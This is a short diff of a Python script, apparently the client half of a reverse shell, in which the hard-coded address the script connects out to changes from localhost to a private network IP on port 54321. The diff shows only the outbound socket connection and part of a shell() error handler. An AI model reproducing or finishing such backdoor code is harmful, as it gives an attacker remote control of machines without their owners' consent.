@@ -48,7 +48,7 @@ def shell():
                 reliable_send(error_message)
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-IP_ADDRESS = '127.0.0.1'
+IP_ADDRESS = '192.168.31.138'
 port = 54321
 sock.connect((IP_ADDRESS, port))
 print(f'Connection Established to Server!')
